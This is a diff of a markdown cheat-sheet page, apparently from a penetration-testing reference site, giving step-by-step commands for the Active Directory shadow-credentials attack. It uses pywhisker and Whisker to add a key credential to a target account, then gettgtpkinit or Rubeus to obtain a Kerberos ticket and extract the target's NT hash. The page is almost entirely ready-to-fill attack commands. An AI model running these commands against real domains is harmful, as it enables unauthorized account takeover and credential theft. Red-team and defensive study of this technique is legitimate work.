@@ -12,64 +12,38 @@ tags: ["AddKeyCredentialLink", "active driectory", "ad", "Windows", "shadow cred
 
 #### 0. Pre-check \[optional\]
 
-<div>
-
 ```console
-python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p '<PASSWORD>' --dc-ip <DC> -t <TARGET_USER> --use-ldaps
+python3 pywhisker.py --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps
 ```
-
-</div>
 
 #### 1. Add shadow credentials
 
-<div>
-
 ```console
-python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p '<PASSWORD>' --dc-ip <DC> -t <TARGET_USER> --use-ldaps
+python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps
 ```
 
-</div>
-
 <br>
-
-<div>
 
 ```console
 # Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type'
 pip3 install -I pyopenssl==24.0.0
 ```
 
-</div>
-
-#### 2. Request TGT using PFX file
-
-<div>
+#### 2. Request TGT using the PFX
 
 ```console
-sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<PFX_PASSWORD>' '<DOMAIN>/<USERNAME>' <USERNAME>.ccache -dc-ip <DC>
+sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' <TARGET_USER>.ccache -dc-ip <DC>
 ```
 
-</div>
-
-#### 3. Import ticket
-
-<div>
+#### 3. Get NT hash
 
 ```console
-export KRB5CCNAME=<USERNAME>.ccache
+export KRB5CCNAME=<TARGET_USER>.ccache
 ```
-
-</div>
-
-#### 4. Get NT hash
-
-<div>
 
 ```console
-python3 getnthash.py '<DOMAIN>/<USERNAME>' -key <AS_REP_ENC_KEY>
+python3 getnthash.py '<DOMAIN>/<TARGET_USER>' -key <AS_REP_ENC_KEY>
 ```
-
-</div>
 
 <small>*Ref: [pywhisker](https://github.com/ShutdownRepo/pywhisker)*</small>
 <br>
@@ -80,36 +54,22 @@ python3 getnthash.py '<DOMAIN>/<USERNAME>' -key <AS_REP_ENC_KEY>
 
 #### 0. Pre-check \[optional\]
 
-<div>
-
 ```console
-.\Whisker.exe list /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC>
+.\whisker.exe list /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC>
 ```
-
-</div>
 
 #### 1. Add shadow credentials
 
-<div>
-
 ```console
-.\Whisker.exe add /domain:<DOMAIN> /target:<TARGET_USER> /dc:<DC> /password:'<PASSWORD>'
+.\whisker.exe add /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC> /password:'<PFX_PASSWORD>'
 ```
 
-</div>
-
-#### 2. Request TGT using PFX file and get NT hash
-
-<div>
+#### 2. Request TGT using PFX file and get NTLM hash
 
 ```console
-.\rubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_CERT> /password:'<PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
+.\rubeus.exe asktgt /user:'<TARGET_USER>' /certificate:<BASE64_PFX> /password:'<PFX_PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
 ```
-
-</div>
 
 <small>*Ref: [Whisker.exe](https://github.com/eladshamir/Whisker)*</small>
 
 {{< /tabcontent >}}
-
-<br>
